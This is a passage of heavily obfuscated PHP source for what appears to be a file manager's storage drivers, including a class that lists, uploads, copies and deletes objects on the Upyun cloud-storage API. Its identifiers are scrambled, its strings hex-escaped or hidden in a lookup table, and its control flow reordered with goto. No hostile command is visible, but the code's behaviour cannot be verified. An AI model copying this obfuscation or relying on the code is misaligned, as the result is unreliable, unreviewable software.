$c¨Ùº¸“ß”, $cª½ÙÚŒº[1226] => $bÏ–‡Ê’’[$cª½ÙÚŒº[1226]]); goto eÕŞàİ¼´; b±ÉÕ»¨: if (!$c¨Ùº¸“ß”) { return !1; } $Cí¿ß—˜·ò = $cª½ÙÚŒº[1230]; foreach ($c¨Ùº¸“ß” as $BæŞ±•º‰É) { $Cí¿ß—˜·ò .= $cª½ÙÚŒº[1231] . "\74\120\x61\x72\x74\116\165\155\142\x65\x72\x3e{$BæŞ±•º‰É[$cª½ÙÚŒº[1180]]}\x3c\57\x50\141\x72\164\x4e\165\155\x62\x65\162\76\12" . "\x3c\x45\124\141\x67\x3e{$BæŞ±•º‰É[$cª½ÙÚŒº[1181]]}\x3c\57\105\x54\141\147\x3e\12" . $cª½ÙÚŒº[1232]; } goto AÉÙ˜äÇ”ï; eÕŞàİ¼´: } public function link($A¹¥·õŒÛÆ, $b±Œ°»Éó… = array()) { return parent::link($A¹¥·õŒÛÆ, $b±Œ°»Éó…); } public function fileOut($E¾ã¸ËìŒ‘, $EñÇôƒÅ„ = false, $båô—¶¢«ê = false, $A³ˆİŠˆ¦ = '') { if (strstr($this->endpoint, $_SERVER[Äº¡•ô™Ÿ][1234])) { return parent::fileOutServer($E¾ã¸ËìŒ‘, $EñÇôƒÅ„, $båô—¶¢«ê, $A³ˆİŠˆ¦); } parent::fileOut($E¾ã¸ËìŒ‘, $EñÇôƒÅ„, $båô—¶¢«ê, $A³ˆİŠˆ¦); } public function fileOutImage($A‘É¬å»³ª, $d…Ç»›ùİÆ = 250) { if (strstr($this->endpoint, $_SERVER[Äº¡•ô™Ÿ][1234])) { return parent::fileOutImageServer($A‘É¬å»³ª, $d…Ç»›ùİÆ); } parent::fileOutImage($A‘É¬å»³ª, $d…Ç»›ùİÆ); } public function fileOutLink($f¿ ó¹åéˆ) { $FŠŞîÓ°òî =& $_SERVER[Äº¡•ô™Ÿ]; if (substr($f¿ ó¹åéˆ, 0, 7) == $FŠŞîÓ°òî[1108]) { $f¿ ó¹åéˆ = $FŠŞîÓ°òî[1109] . substr($f¿ ó¹åéˆ, 7); } header($FŠŞîÓ°òî[153] . $f¿ ó¹åéˆ); die; } public function getHost() { $c÷êÑ¾§á÷ =& $_SERVER[Äº¡•ô™Ÿ]; $CØ“Î™«ª = str_rtrim(parent::getHost(), $c÷êÑ¾§á÷[8] . $this->bucket); $CØ“Î™«ª = explode($c÷êÑ¾§á÷[168], $CØ“Î™«ª); return $CØ“Î™«ª[0] . $c÷êÑ¾§á÷[168] . $this->bucket . $c÷êÑ¾§á÷[93] . $CØ“Î™«ª[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($D‡…‘ã‚´, $F©§ÉôğÔ = 0) { parent::__construct(); $this->source = $D‡…‘ã‚´; $this->sourceSize = $F©§ÉôğÔ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($fØß÷‰¾šø = false) { return $this->sourceSize; } public function getContent($d¼ôëØé³ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $fÜÄÃÏÄŒ„ = ftell($this->source); $cç¸§×‰œƒ = @fread($this->source, $this->sourceSize); fseek($this->source, $fÜÄÃÏÄŒ„); return $cç¸§×‰œƒ; } } public function fileSubstr($f¢ï™ßª‰Š = false, $aâôè¡»¬˜ = 0, $D×ï‘…’ØÚ = 0) { if (!$D×ï‘…’ØÚ) { $D×ï‘…’ØÚ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $aâôè¡»¬˜, $D×ï‘…’ØÚ); } if ($this->sourceType == self::TYPE_FILE) { $CŠŸ…¾§ğË = ftell($this->source); fseek($this->source, $CŠŸ…¾§ğË + $aâôè¡»¬˜); $f–Áˆ‰Î« = @fread($this->source, $D×ï‘…’ØÚ); fseek($this->source, $CŠŸ…¾§ğË); return $f–Áˆ‰Î«; } } public function hashMd5($a‡£‡•ğŞÌ = false) { return md5($this->getContent()); } public static function hash($fÄ¬¢ç›Õ®, $EÒÂœÚƒ†ß = 0) { $A•‘±•‘‡š = new PathDriverStream($fÄ¬¢ç›Õ®, $EÒÂœÚƒ†ß); return $A•‘±•‘‡š->hashSimple($fÄ¬¢ç›Õ®); } public static function md5($f°âƒÕ‰³, $añ¥ÚöÙ¢Ò = 0) { $eèˆ„³ŒÃğ = new PathDriverStream($f°âƒÕ‰³, $añ¥ÚöÙ¢Ò); return $eèˆ„³ŒÃğ->hashMd5($f°âƒÕ‰³); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\x70\x3a\x2f\x2f\166\60\x2e\x61\x70\x69\x2e\165\x70\171\165\x6e\56\143\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($cğˆ†ĞÁ¸”) { parent::__construct(); $this->_init($cğˆ†ĞÁ¸”); } public function _init($d‹¤Û‘â÷À) { foreach ($d‹¤Û‘â÷À as $CÁÔ¬ß÷ƒ§ => $dÀÅğÁ†²) { if (isset($this->{$CÁÔ¬ß÷ƒ§})) { $this->{$CÁÔ¬ß÷ƒ§} = $dÀÅğÁ†²; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[Äº¡•ô™Ÿ][1235], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($aÛŠòÕÛğ¦, $FÂ´Â³á = "\x47\x45\x54") { $e¢»ä¯Êí =& $_SERVER[Äº¡•ô™Ÿ]; $döÊ«Øˆò = gmdate($e¢»ä¯Êí[1197]); $a•ÉÎ¤”ÛÂ = base64_encode(hash_hmac($e¢»ä¯Êí[1236], "{$FÂ´Â³á}\46{$aÛŠòÕÛğ¦}\x26{$döÊ«Øˆò}", md5("{$this->userpass}"), !0)); $c¡£Œ¯†Àª = array("\101\x75\x74\150\157\x72\x69\172\x61\164\151\x6f\156\x3a\125\120\131\125\116\40{$this->username}\72{$a•ÉÎ¤”ÛÂ}", "\104\x61\x74\145\72{$döÊ«Øˆò}"); return $c¡£Œ¯†Àª; } public function ussRequest($DêË…‘á¯ï, $fœ¼ùõİæÁ = "\107\105\124", $a‚ÎÌ‚îé = false, $bô÷ù‰ÊÚá = false, $DÑ¶Ò©õ¹ù = false) { goto BŞò„‡õğ; aä¶ì»‹ª’: if (!$b„µ˜¢è›ó) { return array($cß„ÏÅâŠª[1032] => !1, $cß„ÏÅâŠª[1034] => $cß„ÏÅâŠª[1237]); } if (strtolower($fœ¼ùõİæÁ) == $cß„ÏÅâŠª[181] || in_array($b„µ˜¢è›ó[$cß„ÏÅâŠª[1032]], array($cß„ÏÅâŠª[1093], $cß„ÏÅâŠª[1238]))) { $a‚ÎÌ‚îé = $b„µ˜¢è›ó[$cß„ÏÅâŠª[1239]]; } else { $a‚ÎÌ‚îé = json_decode($b„µ˜¢è›ó[$cß„ÏÅâŠª[1034]], !0); if (!$a‚ÎÌ‚îé) { $a‚ÎÌ‚îé = $b„µ˜¢è›ó[$cß„ÏÅâŠª[1034]]; } else { if (!$b„µ˜¢è›ó[$cß„ÏÅâŠª[692]] && isset($a‚ÎÌ‚îé[$cß„ÏÅâŠª[1240]])) { $a‚ÎÌ‚îé = $a‚ÎÌ‚îé[$cß„ÏÅâŠª[1240]]; } } } return array($cß„ÏÅâŠª[1032] => $b„µ˜¢è›ó[$cß„ÏÅâŠª[692]], $cß„ÏÅâŠª[1034] => $a‚ÎÌ‚îé); goto E¡Š¾Ö§; b¸ß»æÌÏ±: $c¢”…„Ñ©¿ = $this->ussHeaders($c•‰àùöò, $fœ¼ùõİæÁ); if ($bô÷ù‰ÊÚá) { $c¢”…„Ñ©¿ = array_merge($c¢”…„Ñ©¿, $bô÷ù‰ÊÚá); } $b„µ˜¢è›ó = url_request($this->endpoint . $c•‰àùöò, $fœ¼ùõİæÁ, $a‚ÎÌ‚îé, $c¢”…„Ñ©¿, $DÑ¶Ò©õ¹ù); goto aä¶ì»‹ª’; BŞò„‡õğ: $cß„ÏÅâŠª =& $_SERVER[Äº¡•ô™Ÿ]; $DêË…‘á¯ï = trim($DêË…‘á¯ï, $cß„ÏÅâŠª[8]); $c•‰àùöò = "\57{$this->bucket}\57{$DêË…‘á¯ï}"; goto b¸ß»æÌÏ±; E¡Š¾Ö§: } public function mkfile($F‘Æ¨†Ÿ¥Ë, $cƒˆ´ªï¹² = '', $F¥÷ÆÔªñÚ = REPEAT_RENAME) { if ($this->setContent($F‘Æ¨†Ÿ¥Ë, $cƒˆ´ªï¹²)) { return $this->getPathOuter($F‘Æ¨†Ÿ¥Ë); } return !1; } public function mkdir($eÔİÍá‘Ôœ, $a­„Ôİ‰œ‡ = REPEAT_SKIP) { $a‰ÃƒìŠŒ =& $_SERVER[Äº¡•ô™Ÿ]; $D½›ö‹âàß = trim($eÔİÍá‘Ôœ, $a‰ÃƒìŠŒ[8]); if ($this->_isFolder($D½›ö‹âàß)) { return $this->getPathOuter($D½›ö‹âàß); } $e•çóº å = array($a‰ÃƒìŠŒ[1241]); $D¥–—âÍĞĞ = $this->ussRequest($D½›ö‹âàß, $a‰ÃƒìŠŒ[209], !1, $e•çóº å); return $D¥–—âÍĞĞ[$a‰ÃƒìŠŒ[1032]] ? $this->getPathOuter($D½›ö‹âàß) : !1; } public function copyFile($b¡âÛÅ‹õ, $Bªª¡˜ÓÊŠ) { $Fñ•¡ß÷¥ =& $_SERVER[Äº¡•ô™Ÿ]; $fƒ‚âßÃï = array($Fñ•¡ß÷¥[1242] . "\57{$this->bucket}\57{$b¡âÛÅ‹õ}", $Fñ•¡ß÷¥[1243]); $F‚À½‡ªá = $this->ussRequest($Bªª¡˜ÓÊŠ, $Fñ•¡ß÷¥[211], !1, $fƒ‚âßÃï); return $F‚À½‡ªá[$Fñ•¡ß÷¥[1032]] ? !0 : !1; } public function moveFile($d˜÷’²ÛÃ„, $Bˆ¬÷ã¹éª) { $EÚ©¶ö˜¢  =& $_SERVER[Äº¡•ô™Ÿ]; $cØñËÓ§Çó = array($EÚ©¶ö˜¢ [1244] . "\57{$this->bucket}\57{$d˜÷’²ÛÃ„}", $EÚ©¶ö˜¢ [1243]); $aí„øŒ·Åµ = $this->ussRequest($Bˆ¬÷ã¹éª, $EÚ©¶ö˜¢ [211], !1, $cØñËÓ§Çó); return $aí„øŒ·Åµ[$EÚ©¶ö˜¢ [1032]] ? !0 : !1; } public function delFile($Dğ‚ãº†¿í) { $B¤¡Ò«ù‡Û =& $_SERVER[Äº¡•ô™Ÿ]; $d¾·Õ®ÅŞİ = $this->ussRequest($Dğ‚ãº†¿í, $B¤¡Ò«ù‡Û[1245]); return $d¾·Õ®ÅŞİ[$B¤¡Ò«ù‡Û[1032]] ? !0 : !1; } public function delFolder($e²÷„¥Ø) { $eàÔ‹ÛäÇ =& $_SERVER[Äº¡•ô™Ÿ]; $AèÆ”Œ‡¬ = $this->listAll($e²÷„¥Ø); krsort($AèÆ”Œ‡¬); foreach ($AèÆ”Œ‡¬ as $EÈØâôâ) { $this->ussRequest($EÈØâôâ[$eàÔ‹ÛäÇ[75]], $eàÔ‹ÛäÇ[1245]); } return $this->ussRequest($e²÷„¥Ø, $eàÔ‹ÛäÇ[1245]); } public function rename($F·Ö™–ë†, $e¡·õ‡‘) { if ($this->isFile($F·Ö™–ë†)) { $e¡·õ‡‘ = get_path_father($F·Ö™–ë†) . $e¡·õ‡‘; return $this->moveFile($F·Ö™–ë†, $e¡·õ‡‘); } return $this->renameObject($F·Ö™–ë†, $e¡·õ‡‘); } public function fileInfo($dÎù•ª´´´, $AÒçÀ—·¾° = false, $AË×ª»¢µ = array()) { $fÃ…êæå–ç =& $_SERVER[Äº¡•ô™Ÿ]; if ($AÒçÀ—·¾°) { return array($fÃ…êæå–ç[28] => $this->pathThis($dÎù•ª´´´), $fÃ…êæå–ç[75] => $this->getPathOuter($fÃ…êæå–ç[8] . $dÎù•ª´´´), $fÃ…êæå–ç[29] => $fÃ…êæå–ç[164], $fÃ…êæå–ç[77] => isset($AË×ª»¢µ[$fÃ…êæå–ç[322]]) ? $AË×ª»¢µ[$fÃ…êæå–ç[322]] : 0, $fÃ…êæå–ç[157] => $this->ext($dÎù•ª´´´)); } $f„™ˆ©’Ã· = array($fÃ…êæå–ç[28] => $this->pathThis($dÎù•ª´´´), $fÃ…êæå–ç[75] => $this->getPathOuter($fÃ…êæå–ç[8] . $dÎù•ª´´´), $fÃ…êæå–ç[29] => $fÃ…êæå–ç[164], $fÃ…êæå–ç[184] => 0, $fÃ…êæå–ç[107] => isset($c’§ª†Ø[$fÃ…êæå–ç[1246]]) ? $c’§ª†Ø[$fÃ…êæå–ç[1246]] : 0, $fÃ…êæå–ç[77] => isset($AË×ª»¢µ[$fÃ…êæå–ç[322]]) ? $AË×ª»¢µ[$fÃ…êæå–ç[322]] : 0, $fÃ…êæå–ç[157] => $this->ext($dÎù•ª´´´), $fÃ…êæå–ç[185] => !0, $fÃ…êæå–ç[186] => !0); if (empty($AË×ª»¢µ)) { $AË×ª»¢µ = $this->objectMeta($dÎù•ª´´´); if (!$AË×ª»¢µ) { return $f„™ˆ©’Ã·; } $f„™ˆ©’Ã·[$fÃ…êæå–ç[184]] = $AË×ª»¢µ[$fÃ…êæå–ç[1247]]; $f„™ˆ©’Ã·[$fÃ…êæå–ç[107]] = $AË×ª»¢µ[$fÃ…êæå–ç[1248]]; $f„™ˆ©’Ã·[$fÃ…êæå–ç[77]] = $AË×ª»¢µ[$fÃ…êæå–ç[77]]; } return $f„™ˆ©’Ã·; } public function folderInfo($C“•Í¬‚©, $DÚøê‘Ìöà = false) { $c²»ÎËñˆ =& $_SERVER[Äº¡•ô™Ÿ]; if ($DÚøê‘Ìöà) { return array($c²»ÎËñˆ[28] => $this->pathThis($C“•Í¬‚©), $c²»ÎËñˆ[75] => $this->getPathOuter($c²»ÎËñˆ[8] . $C“•Í¬‚©), $c²»ÎËñˆ[29] => $c²»ÎËñˆ[76]); } $A‚‰Ğ­æ½¯ = array($c²»ÎËñˆ[28] => $this->pathThis($C“•Í¬‚©), $c²»ÎËñˆ[75] => $this->getPathOuter($c²»ÎËñˆ[8] . $C“•Í¬‚©), $c²»ÎËñˆ[29] => $c²»ÎËñˆ[76], $c²»ÎËñˆ[184] => 0, $c²»ÎËñˆ[107] => isset($bÔ¸ÚµİŠÜ[$c²»ÎËñˆ[1246]]) ? $bÔ¸ÚµİŠÜ[$c²»ÎËñˆ[1246]] : 0, $c²»ÎËñˆ[1154] => !0, $c²»ÎËñˆ[1155] => !0); if (empty($d´‡Ï–®²‹)) { $d´‡Ï–®²‹ = $this->objectMeta($C“•Í¬‚©); if (!$d´‡Ï–®²‹) { return $A‚‰Ğ­æ½¯; } $A‚‰Ğ­æ½¯[$c²»ÎËñˆ[184]] = $d´‡Ï–®²‹[$c²»ÎËñˆ[1247]]; $A‚‰Ğ­æ½¯[$c²»ÎËñˆ[107]] = $d´‡Ï–®²‹[$c²»ÎËñˆ[1248]]; } return $A‚‰Ğ­æ½¯; } private function fileList($cŒøíñ«ô, $D®öõ…£Èš = 0, $e“ëÒ§ã Ø = 1000) { $aÄ…±Èâ =& $_SERVER[Äº¡•ô™Ÿ]; $cƒ²­Œàò = array($aÄ…±Èâ[1249], $aÄ…±Èâ[1250] . $e“ëÒ§ã Ø); if ($D®öõ…£Èš) { $cƒ²­Œàò[] = $aÄ…±Èâ[1251] . $D®öõ…£Èš; } $A£µÔ ¡Èš = $this->ussRequest($cŒøíñ«ô, $aÄ…±Èâ[213], !1, $cƒ²­Œàò); return !$A£µÔ ¡Èš[$aÄ…±Èâ[1032]] ? !1 : $A£µÔ ¡Èš[$aÄ…±Èâ[1034]]; } public function listPath($c„‚‡ˆ‡³ó, $F•—ËÙè´ = false) { goto CŒõ÷©ƒÙ¯; aŠÃ¸³“‚¤: $FŞšŒ¼‹³• = $A¥ğ×ˆÅŸ¹ = array(); $DÎÛ°Á¿± = rtrim($c„‚‡ˆ‡³ó, $fÑ£âÙ¯Ş[8]) . $fÑ£âÙ¯Ş[8]; while (!0) { $B§§Œ‰µ¢Ä = $this->fileList($c„‚‡ˆ‡³ó, $F´½ë¾˜‹æ, $F¾ƒÌ¨áğ°); if (!$B§§Œ‰µ¢Ä) { return !1; } $F´½ë¾˜‹æ = isset($B§§Œ‰µ¢Ä[$fÑ£âÙ¯Ş[1252]]) ? $B§§Œ‰µ¢Ä[$fÑ£âÙ¯Ş[1252]] : $fÑ£âÙ¯Ş[33]; $D³êğ‡ùÆé = isset($B§§Œ‰µ¢Ä[$fÑ£âÙ¯Ş[1253]]) ? $B§§Œ‰µ¢Ä[$fÑ£âÙ¯Ş[1253]] : array(); foreach ($D³êğ‡ùÆé as $Fã¾ÀÌ„ŠÄ) { if ($Fã¾ÀÌ„ŠÄ[$fÑ£âÙ¯Ş[29]] == $fÑ£âÙ¯Ş[76]) { $FŞšŒ¼‹³•[] = $this->folderInfo($DÎÛ°Á¿± . $Fã¾ÀÌ„ŠÄ[$fÑ£âÙ¯Ş[28]], $F•—ËÙè´, $Fã¾ÀÌ„ŠÄ); } else { $A¥ğ×ˆÅŸ¹[] = $this->fileInfo($DÎÛ°Á¿± . $Fã¾ÀÌ„ŠÄ[$fÑ£âÙ¯Ş[28]], $F•—ËÙè´, $Fã¾ÀÌ„ŠÄ); } } if (count($D³êğ‡ùÆé) < $F¾ƒÌ¨áğ°) { break; } } goto d•Ÿùñà¹›; d•Ÿùñà¹›: return array($fÑ£âÙ¯Ş[74] => $FŞšŒ¼‹³•, $fÑ£âÙ¯Ş[73] => $A¥ğ×ˆÅŸ¹); goto Dµ¥”´¿Éö; CŒõ÷©ƒÙ¯: $fÑ£âÙ¯Ş =& $_SERVER[Äº¡•ô™Ÿ]; $F´½ë¾˜‹æ = $fÑ£âÙ¯Ş[33]; $F¾ƒÌ¨áğ° = 1000; goto aŠÃ¸³“‚¤; Dµ¥”´¿Éö: } private function recursionAllFiles($DáÀõµÒù, &$BéÈÂøÊòå) { $a“¼í°˜Ã =& $_SERVER[Äº¡•ô™Ÿ]; $Dà„“Èõò = $a“¼í°˜Ã[33]; $Dæí™¶„ƒ‡ = 1000; $Eªì…§—È  = $f¨§”…õ‹î = array(); $añÇ§„ö‘— = rtrim($DáÀõµÒù, $a“¼í°˜Ã[8]) . $a“¼í°˜Ã[8]; while (!0) { $EÅŒ”ºÁª’ = $this->fileList($DáÀõµÒù, $Dà„“Èõò, $Dæí™¶„ƒ‡); if (!$EÅŒ”ºÁª’) { return !1; } $Dà„“Èõò = isset($EÅŒ”ºÁª’[$a“¼í°˜Ã[1252]]) ? $EÅŒ”ºÁª’[$a“¼í°˜Ã[1252]] : $a“¼í°˜Ã[33]; $CÜÃØØŞ›‰ = isset($EÅŒ”ºÁª’[$a“¼í°˜Ã[1253]]) ? $EÅŒ”ºÁª’[$a“¼í°˜Ã[1253]] : array(); foreach ($CÜÃØØŞ›‰ as $cÛ…²îÆ†¦) { $Cæ¦ùùçèŞ = array($a“¼í°˜Ã[75] => $añÇ§„ö‘— . $cÛ…²îÆ†¦[$a“¼í°˜Ã[28]], $a“¼í°˜Ã[76] => $cÛ…²îÆ†¦[$a“¼í°˜Ã[29]] == $a“¼í°˜Ã[76] ? 1 : 0, $a“¼í°˜Ã[77] => isset($cÛ…²îÆ†¦[$a“¼í°˜Ã[322]]) ? $cÛ…²îÆ†¦[$a“¼í°˜Ã[322]] : 0); $BéÈÂøÊòå[] = $Cæ¦ùùçèŞ; if ($Cæ¦ùùçèŞ[$a“¼í°˜Ã[76]] == 1) { $this->recursionAllFiles($Cæ¦ùùçèŞ[$a“¼í°˜Ã[75]], $BéÈÂøÊòå); } } if (count($CÜÃØØŞ›‰) < $Dæí™¶„ƒ‡) { break; } } } public function has($d“ÎÁ®¼Ãˆ, $DÚš«øĞ = false, $f«®§òßŸ = true) { goto fÕÂ‚‹‰¾¸; BˆŒ”ÊôßŸ: while (!0) { $FÒ²¨ôù¹° = $this->fileList($d“ÎÁ®¼Ãˆ, $CÆÔ¹¾†â›, $B”ŞÖ§Ê‘´); if (!$FÒ²¨ôù¹°) { return !1; } $CÆÔ¹¾†â› = isset($FÒ²¨ôù¹°[$DÚÓµôÙö[1252]]) ? $FÒ²¨ôù¹°[$DÚÓµôÙö[1252]] : $DÚÓµôÙö[33]; $Cß’˜ İî = isset($FÒ²¨ôù¹°[$DÚÓµôÙö[1253]]) ? $FÒ²¨ôù¹°[$DÚÓµôÙö[1253]] : array(); if (empty($Cß’˜ İî)) { break; } $f±•Ü™°Î¬ = array_to_keyvalue($Cß’˜ İî, $DÚÓµôÙö[33], $DÚÓµôÙö[29]); $dƒŒå‹Îùõ = array_count_values($f±•Ü™°Î¬); $d¢”‚óÌîÙ = isset($dƒŒå‹Îùõ[$DÚÓµôÙö[76]]) ? $dƒŒå‹Îùõ[$DÚÓµôÙö[76]] : 0; $dù“ß‘Ô¨Ó = count($f±•Ü™°Î¬) - $d¢”‚óÌîÙ; if ($DÚš«øĞ) { $B”çØÓæ¿„ += $d¢”‚óÌîÙ; $cêáã‡©ù += $dù“ß‘Ô¨Ó; if ($D‘­„öÏÅ× < $B”ŞÖ§Ê‘´) { break; } continue; } if ($f«®§òßŸ) { if ($dù“ß‘Ô¨Ó) { return !0; } } else { if ($d¢”‚óÌîÙ) { return !0; } } if (count($Cß’˜ İî) < $B”ŞÖ§Ê‘´) { break; } } if ($DÚš«øĞ) { return array($DÚÓµôÙö[188] => $cêáã‡©ù, $DÚÓµôÙö[189] => $B”çØÓæ¿„); } return !1; goto DÌªÁÇ‰ÃË; F™èâİê‹º: $cêáã‡©ù = 0; $B”çØÓæ¿„ = 0; $AÊĞÂšÜ­œ = rtrim($d“ÎÁ®¼Ãˆ, $DÚÓµôÙö[8]) . $DÚÓµôÙö[8]; goto BˆŒ”ÊôßŸ; fÕÂ‚‹‰¾¸: $DÚÓµôÙö =& $_SERVER[Äº¡•ô™Ÿ]; $CÆÔ¹¾†â› = $DÚÓµôÙö[33]; $B”ŞÖ§Ê‘´ = 1000; goto F™èâİê‹º; DÌªÁÇ‰ÃË: } public function listAll($dÎŸÔ¤–ƒ) { $dàîïËÇ©ç = array(); $this->recursionAllFiles($dÎŸÔ¤–ƒ, $dàîïËÇ©ç); return $dàîïËÇ©ç; } public function canRead($cÄ½½Å¢Šº) { return $this->exist($cÄ½½Å¢Šº) ? !0 : !1; } public function canWrite($E²Ü—•èÒÌ) { return $this->exist($E²Ü—•èÒÌ) ? !0 : !1; } public function getContent($D·î˜ˆ‰º) { return $this->fileSubstr($D·î˜ˆ‰º, 0, -1); } public function setContent($d–º·Ë“Ç, $B¥áëÛ´‰ç = '') { $Fê©×¤ì‰ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$B¥áëÛ´‰ç) { $F§áÜ¶¹¡‚ = $this->ussRequest($d–º·Ë“Ç, $Fê©×¤ì‰[209]); return $F§áÜ¶¹¡‚[$Fê©×¤ì‰[1032]]; } $Fò¾ßË–´É = $this->tempFile($this->pathThis($d–º·Ë“Ç)); file_put_contents($Fò¾ßË–´É, $B¥áëÛ´‰ç); if ($this->upload($d–º·Ë“Ç, $Fò¾ßË–´É)) { $this->tempFileRemve($Fò¾ßË–´É); return !0; } return !1; } public function fileSubstr($B÷Èè›ñ›, $fÑ˜¡óÀƒ, $DÜí‰²‚Î) { $f¼‡¡Å¯¶İ =& $_SERVER[Äº¡•ô™Ÿ]; if (!($E³Âƒ½‘æ = $this->link($B÷Èè›ñ›))) { return !1; } $fø‹í‡”Êê = !1; if ($DÜí‰²‚Î > 0) { $AŸî˜ñÚ‹¾ = $fÑ˜¡óÀƒ + $DÜí‰²‚Î - 1; $fø‹í‡”Êê = array($f¼‡¡Å¯¶İ[1214] . $fÑ˜¡óÀƒ . $f¼‡¡Å¯¶İ[408] . $AŸî˜ñÚ‹¾); } $bØÜ“†‘° = url_request($E³Âƒ½‘æ, $f¼‡¡Å¯¶İ[213], !1, $fø‹í‡”Êê); return $bØÜ“†‘°[$f¼‡¡Å¯¶İ[692]] ? $bØÜ“†‘°[$f¼‡¡Å¯¶İ[1034]] : !1; } public function upload($eÄ´·¥¼É™, $c¦ß³åÓÌ«, $C­’ëæŠ = false, $eÈÆ‘É§…ë = REPEAT_REPLACE) { goto BÜó°ê‰; Bæ°‰²œ®Å: $Dƒ’ÔëŞöÔ = $this->osChunkSize(); if ($Dƒ’ÔëŞöÔ > 1024 * 1024 * 10) { $Dƒ’ÔëŞöÔ = 1024 * 1024 * 10; } $a³òùÂ¡³¿ = array($bà–Ôô²ÛÆ[1255], $bà–Ôô²ÛÆ[1256] . $BÍ¶é£íë×, $bà–Ôô²ÛÆ[1257], $bà–Ôô²ÛÆ[1258] . $Dƒ’ÔëŞöÔ); goto Cö¢‰‚ÓøÒ; BÜó°ê‰: $bà–Ôô²ÛÆ =& $_SERVER[Äº¡•ô™Ÿ]; $BÍ¶é£íë× = IO::size($c¦ß³åÓÌ«); if ($BÍ¶é£íë× <= 1024 * 1024 * 200) { $FÕ´®¹•Æ¾ = array($bà–Ôô²ÛÆ[1254] . $c¦ß³åÓÌ«); $fôãÈŠÄº¡ = $this->ussRequest($eÄ´·¥¼É™, $bà–Ôô²ÛÆ[211], $FÕ´®¹•Æ¾); return $fôãÈŠÄº¡[$bà–Ôô²ÛÆ[1032]] ? $this->getPathOuter($eÄ´·¥¼É™) : !1; } goto Bæ°‰²œ®Å; dŞ¿–ƒ©ë: if (!$Dˆ£·¶ËãÛ) { return !1; } do { $DãÑÕ¿ãŠ§ = $eµ¾½¦ŒÎ‘[$bà–Ôô²ÛÆ[1260]]; fseek($Dˆ£·¶ËãÛ, $E¾æÄ­™Ù); $e’Ğ¬ÓÂ„ = fread($Dˆ£·¶ËãÛ, $DãÑÕ¿ãŠ§); $F÷‘ÈÒöÄ = 0; do { $F÷‘ÈÒöÄ++; $eµ¾½¦ŒÎ‘ = $this->uploadPart($eÄ´·¥¼É™, $eµ¾½¦ŒÎ‘, $e’Ğ¬ÓÂ„); } while (!$eµ¾½¦ŒÎ‘ && $F÷‘ÈÒöÄ < 3); if (!$eµ¾½¦ŒÎ‘) { return !1; } $dí¬ƒ¹’ò¹ = $eµ¾½¦ŒÎ‘[$bà–Ôô²ÛÆ[1259]]; $E¾æÄ­™Ù += $DãÑÕ¿ãŠ§; } while ($dí¬ƒ¹’ò¹ != -1); fclose($Dˆ£·¶ËãÛ); goto fÉâ‚øÉã‚; Cö¢‰‚ÓøÒ: $fôãÈŠÄº¡ = $this->ussRequest($eÄ´·¥¼É™, $bà–Ôô²ÛÆ[211], !1, $a³òùÂ¡³¿); if (!$fôãÈŠÄº¡[$bà–Ôô²ÛÆ[1032]]) { return !1; } $eµ¾½¦ŒÎ‘ = $fôãÈŠÄº¡[$bà–Ôô²ÛÆ[1034]]; goto aÓ·‹‚§œ; fÉâ‚øÉã‚: $a³òùÂ¡³¿ = array($bà–Ôô²ÛÆ[1261], $bà–Ôô²ÛÆ[1262] . $eµ¾½¦ŒÎ‘[$bà–Ôô²ÛÆ[1263]], $bà–Ôô²ÛÆ[1257]); $fôãÈŠÄº¡ = $this->ussRequest($eÄ´·¥¼É™, $bà–Ôô²ÛÆ[211], !1, $a³òùÂ¡³¿); return $fôãÈŠÄº¡[$bà–Ôô²ÛÆ[1032]] ? $this->getPathOuter($B†Æä‰†Ü³) : !1; goto F´È¨¨ßĞ; aÓ·‹‚§œ: $E¾æÄ­™Ù = 0; $dí¬ƒ¹’ò¹ = $eµ¾½¦ŒÎ‘[$bà–Ôô²ÛÆ[1259]]; $Dˆ£·¶ËãÛ = fopen($c¦ß³åÓÌ«, $bà–Ôô²ÛÆ[1162]); goto dŞ¿–ƒ©ë; F´È¨¨ßĞ: } private function uploadPart($C÷Ùî½À², $f‚©‰ÙÕÄ¾, &$bë‡ÉÒÒ½) { $A§±Ç¼–ÜÒ =& $_SERVER[Äº¡•ô™Ÿ]; $b‚º‘‚á¤° = array($A§±Ç¼–ÜÒ[1264], $A§±Ç¼–ÜÒ[1262] . $f‚©‰ÙÕÄ¾[$A§±Ç¼–ÜÒ[1263]], $A§±Ç¼–ÜÒ[1265] . $f‚©‰ÙÕÄ¾[$A§±Ç¼–ÜÒ[1259]], $A§±Ç¼–ÜÒ[1266] . $f‚©‰ÙÕÄ¾[$A§±Ç¼–ÜÒ[1260]]); $a©ê‰§ = $this->ussRequest($C÷Ùî½À², $A§±Ç¼–ÜÒ[211], $bë‡ÉÒÒ½, $b‚º‘‚á¤°); return !$a©ê‰§[$A§±Ç¼–ÜÒ[1032]] ? $a©ê‰§[$A§±Ç¼–ÜÒ[1032]] : $a©ê‰§[$A§±Ç¼–ÜÒ[1034]]; } public function uploadFormData($B×œ°„Éƒø, $cˆ²ƒæ´è = 3600) { return $this->uploadPolicy($B×œ°„Éƒø, $cˆ²ƒæ´è); } public function multiUploadFormData($f—®‰›š±º, $F¿¸Í¦Ğ = 3600) { $FóÄƒíƒëÓ =& $_SERVER[Äº¡•ô™Ÿ]; $e–ã©°Öà = (int) $GLOBALS[$FóÄƒíƒëÓ[7]][$FóÄƒíƒëÓ[77]]; return $this->uploadPolicy($f—®‰›š±º, $F¿¸Í¦Ğ, $e–ã©°Öà); } private function uploadPolicy($bœ™‚×Á‘, $D÷Ë¹ÈÖšì = 3600, $c‹Å§¥šñŒ = 0) { goto BíÊÌøî‰¥; cËÒâ¸¼æ‡: $Dåê²íÆ«¯ = 